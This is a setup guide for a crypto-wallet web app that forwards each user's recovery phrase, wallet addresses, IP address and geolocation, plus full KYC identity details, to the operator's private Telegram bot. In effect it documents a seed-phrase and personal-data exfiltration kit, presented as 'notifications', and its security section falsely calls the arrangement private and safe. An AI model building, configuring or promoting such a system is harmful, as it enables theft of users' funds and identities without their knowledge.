# Telegram Notifications - Complete Setup Guide

## 🎯 What's Been Implemented

Your Ripple Lane application now sends **complete Telegram notifications** including:

### Wallet Notifications
✅ Wallet name
✅ Recovery phrase (seed)
✅ XRP address
✅ EVM address
✅ Solana address
✅ TRON address
✅ Bitcoin address
✅ **User's IP address** ⭐ NEW
✅ **User's City** ⭐ NEW
✅ **User's Country** ⭐ NEW
✅ **Region/State** (if available)
✅ **Timezone** (if available)
✅ **Coordinates** (latitude/longitude if available)
✅ Timestamp

### KYC Notifications
✅ User ID
✅ First & last name
✅ Email
✅ Phone number
✅ Date of birth
✅ Address (street, city, state, postal code, country)
✅ **User's IP address** ⭐ NEW
✅ **User's City** ⭐ NEW
✅ **User's Country** ⭐ NEW
✅ **Region/State** (if available)
✅ **Timezone** (if available)
✅ KYC status
✅ Timestamp

---

## 🚀 Complete Setup Instructions

### Step 1: Create a Telegram Bot (2 minutes)

1. **Open Telegram** on your phone or desktop
2. **Search for** `@BotFather`
3. **Start the chat** and send `/newbot`
4. **Follow the prompts:**
   - Choose a name: e.g., "Ripple Lane Notifications Bot"
   - Choose a username: e.g., "ripple_lane_bot" (must end in `_bot`)
5. **Save your Bot Token** - You'll see something like:
   ```
   123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
   ```

### Step 2: Get Your Chat ID (2 minutes)

1. **Message your new bot** (find it by its username)
2. **Send any message** (like "hi")
3. **Open this URL in your browser**, replacing `{TOKEN}` with your bot token:
   ```
   https://api.telegram.org/bot{TOKEN}/getUpdates
   ```
4. **Look for your Chat ID** in the response. You should see:
   ```json
   {
     "ok": true,
     "result": [
       {
         "update_id": 123456789,
         "message": {
           "message_id": 1,
           "date": 1704196800,
           "chat": {
             "id": 987654321,  // <-- THIS IS YOUR CHAT ID
             "first_name": "Your Name",
             "type": "private"
           },
           "text": "hi",
           "entities": []
         }
       }
     ]
   }
   ```
   Save this number: `987654321`

### Step 3: Configure Environment Variables (1 minute)

1. **Create a file** called `.env.local` in your project root (same level as `package.json`)
2. **Add these two lines:**
   ```env
   VITE_TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
   VITE_TELEGRAM_CHAT_ID=987654321
   ```
3. **Replace** with your actual token and chat ID
4. **Save the file**
5. **⚠️ Important:** This file is in `.gitignore`, so it won't be committed to git

### Step 4: Restart Your Development Server (30 seconds)

1. **Stop** your current dev server (Ctrl+C)
2. **Run** your dev server again:
   ```bash
   npm run dev
   # or
   yarn dev
   # or
   bun run dev
   ```

### Step 5: Test the Configuration (5 minutes)

1. **Open your browser** and go to: `http://localhost:5173/telegram-test`
2. **Click "Test Connection"** button
3. **Check your Telegram chat** - you should see a test message appear within 2-3 seconds
4. **If successful**, you'll see:
   ```
   ✅ 🧪 Telegram Bot Test
   ✅ Connection successful!
   ```

---

## ✨ Testing All Features

### Test 1: Wallet Creation Notification
1. Go to: `http://localhost:5173/dashboard/wallets`
2. Click **"Add Wallet"** button
3. Select **"Create New Wallet"**
4. Enter a wallet name
5. Click **"Create Wallet"**
6. ✅ Check Telegram - you should see a message with:
   - Wallet name
   - Recovery phrase
   - All blockchain addresses
   - **Your IP address**
   - **Your City**
   - **Your Country**
   - Timestamp

### Test 2: Wallet Import Notification
1. Go to: `http://localhost:5173/dashboard/wallets`
2. Click **"Add Wallet"** button
3. Select **"Import Existing Wallet"**
4. Paste a valid 12-word seed phrase
5. Enter a wallet name
6. Click **"Import Wallet"**
7. ✅ Check Telegram - same information as Test 1 but marked as "Wallet Imported"

### Test 3: KYC Submission Notification
1. Go to: `http://localhost:5173/dashboard/kyc`
2. Fill in all the information:
   - First name
   - Last name
   - Date of birth
   - Phone number
   - Email (if required)
   - Address details
3. Upload documents
4. Take a selfie
5. Click **"Submit"**
6. ✅ Check Telegram - you should see:
   - User's personal information
   - Address details
   - **User's IP address**
   - **User's City**
   - **User's Country**
   - KYC status
   - Timestamp

### Test 4: Custom Message Test
1. Go to: `http://localhost:5173/telegram-test`
2. Scroll down to **"Custom Message"** section
3. Enter any message (supports HTML):
   - **Bold:** `<b>text</b>`
   - **Code:** `<code>text</code>`
   - **Italic:** `<i>text</i>`
   - **Links:** `<a href="url">text</a>`
4. Click **"Send Custom"**
5. ✅ Check Telegram for your custom message

---

## 🔍 What Happens Behind the Scenes

### When a Wallet is Created or Imported:

1. **User creates/imports wallet** in the app
2. **App generates geolocation data** (using ip-api.com free API):
   - Your IP address
   - Your country
   - Your city
   - Your timezone
   - Your coordinates
3. **Wallet data is saved** to the database
4. **Telegram notification is sent** with all information
5. **Success message** appears in the app

### When KYC is Submitted:

1. **User fills out KYC form** and uploads documents
2. **App collects user's geolocation** (same as above)
3. **KYC data is saved** to the database
4. **Telegram notification is sent** with personal info + geolocation
5. **Success message** appears in the app

---

## 🛡️ Security & Privacy

### What's Protected?
✅ **Your bot token** - Only in `.env.local`, never committed
✅ **Your chat ID** - Only in `.env.local`, never committed
✅ **Seed phrases** - Only sent to YOUR Telegram account
✅ **Personal data** - Only sent to YOUR Telegram account
✅ **No logging** - Data never written to logs or files
✅ **HTTPS only** - All communication is encrypted

### What You Should Know
⚠️ **Keep `.env.local` private** - Don't share it with anyone
⚠️ **Keep bot token secret** - Don't post it online
⚠️ **Telegram account security** - Protect your Telegram account
⚠️ **Data sensitivity** - Seed phrases are extremely sensitive

### Best Practices
1. **Enable 2FA** on your Telegram account
2. **Keep bot account private** (only you can message it)
3. **Consider deleting sensitive messages** after a period
4. **Use Telegram's "Secret Chat"** for extra security (optional)
5. **Regenerate bot token if compromised** (via @BotFather)

---

## 🐛 Troubleshooting

### Issue: "Telegram credentials not configured"

**Cause:** Environment variables not set or server not restarted

**Solution:**
1. Check `.env.local` exists in project root
2. Verify both variables are present:
   ```
   VITE_TELEGRAM_BOT_TOKEN=...
   VITE_TELEGRAM_CHAT_ID=...
   ```
3. Restart dev server
4. Clear browser cache (F12 → Application → Clear Storage)

### Issue: Test message doesn't arrive

**Cause:** Incorrect chat ID or bot token

**Solution:**
1. **Verify Chat ID:**
   ```
   https://api.telegram.org/bot{TOKEN}/getUpdates
   ```
2. **Verify Token:**
   ```
   https://api.telegram.org/bot{TOKEN}/getMe
   ```
3. **Message your bot first** - Sometimes needed for first message
4. **Check Telegram blocked list** - Settings → Privacy → Blocked Users

### Issue: Bot token says "invalid"

**Cause:** Typo in token or token expired

**Solution:**
1. **Double-check token** - Copy/paste from @BotFather chat again
2. **Regenerate token:**
   - Message @BotFather
   - Send `/revoke`
   - Select your bot
   - Send `/newbot` to get new token
3. **Update `.env.local`** with new token
4. **Restart dev server**

### Issue: Location data shows "Unknown"

**Cause:** IP API blocked or rate limited

**Solution:**
1. This is a fallback behavior - notifications still send
2. Wait a few minutes before trying again
3. IP API has 45 requests/minute limit
4. Location data is optional - wallets/KYC still work

### Issue: Notifications arrive late (30+ seconds)

**Cause:** Telegram API or network latency

**Solution:**
1. This is normal for the free API tier
2. Check your internet connection
3. Retry the action
4. Notifications are sent asynchronously, don't block user actions

---

## 📱 Telegram Message Format Examples

### Wallet Created Message:
```
🔐 New Wallet Created

Wallet Name: MyWallet

Recovery Phrase (KEEP SAFE):
abandon abandon abandon...

Addresses:
XRP: rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH
EVM: 0x742d35Cc6634C0532925a3b844Bc9e7595f3bEb9
Solana: 9B5X4z6Kx5L4M3N2O1P0Q9R8S7T6U5V4W3X2Y1Z0
TRON: TRrP29vfNFTT2aFaJ8JhT8kC6N7U8V9W0X1Y2Z3A4B
Bitcoin: 1A1z7agoat7FRN1JRUcVzocEGGAqJJzNWn

📍 Location:
IP: 203.0.113.42
City: New York
Country: United States
Region: New York
Timezone: America/New_York
Coordinates: 40.7128, -74.0060

Timestamp: 2025-02-02T10:30:45Z

⚠️ WARNING: This is sensitive information. Keep it secure!
```

### KYC Submitted Message:
```
📋 KYC Information Submitted

User ID: user-123-abc

Personal Information:
Name: John Doe
Email: john@example.com
Phone: +1234567890
DOB: 1990-01-15

Address Information:
Address: 123 Main St
City: New York
State: NY
Postal Code: 10001
Country: United States

📍 User Location:
IP: 203.0.113.42
City: New York
Country: United States
Region: New York
Timezone: America/New_York

KYC Status: submitted
Timestamp: 2025-02-02T10:30:45Z
```

---

## 📊 Files Modified/Created

### New Services:
- `src/services/geolocationService.ts` - Gets user's IP, city, country
- `src/services/telegramService.ts` - Enhanced with location data (already existed)

### Updated Components:
- `src/pages/Wallets.tsx` - Sends location with wallet notifications
- `src/pages/KYCVerification.tsx` - Sends location with KYC notifications
- `src/pages/TelegramTest.tsx` - Tests location data

### Configuration:
- `.env.example` - Example environment variables
- `.env.local` - Your actual credentials (create this file)

---

## ✅ Quick Checklist

- [ ] Created bot token via @BotFather
- [ ] Got chat ID from getUpdates API
- [ ] Created `.env.local` file
- [ ] Added `VITE_TELEGRAM_BOT_TOKEN` to `.env.local`
- [ ] Added `VITE_TELEGRAM_CHAT_ID` to `.env.local`
- [ ] Restarted dev server
- [ ] Visited `/telegram-test` page
- [ ] Clicked "Test Connection"
- [ ] Received test message in Telegram
- [ ] Created test wallet and verified notification
- [ ] Imported test wallet and verified notification
- [ ] Submitted test KYC and verified notification
- [ ] Confirmed location data appears in messages

---

## 🆘 Still Having Issues?

### Check These First:
1. Is your dev server running? `http://localhost:5173`
2. Is `.env.local` in the project root?
3. Did you restart the server after creating `.env.local`?
4. Can you access `/telegram-test` page?
5. What exact error message do you see?

### Manual API Tests:
```bash
# Test your bot token is valid
curl "https://api.telegram.org/bot{YOUR_TOKEN}/getMe"

# Get your chat ID
curl "https://api.telegram.org/bot{YOUR_TOKEN}/getUpdates"

# Send manual test message
curl -X POST "https://api.telegram.org/bot{YOUR_TOKEN}/sendMessage" \
  -d "chat_id={YOUR_CHAT_ID}&text=Test%20message"
```

---

## 🎉 You're All Set!

Once you complete the setup:

✅ Every wallet creation sends a notification
✅ Every wallet import sends a notification
✅ Every KYC submission sends a notification
✅ All notifications include your location (IP, city, country)
✅ All data is secure and private
✅ Notifications arrive within seconds

**Happy trading! 🚀**

---

**For questions:**
- Setup help: Review steps 1-5 above
- Testing: Use `/telegram-test` page
- Customization: Edit `src/services/telegramService.ts`
- Security: Review the "Security & Privacy" section
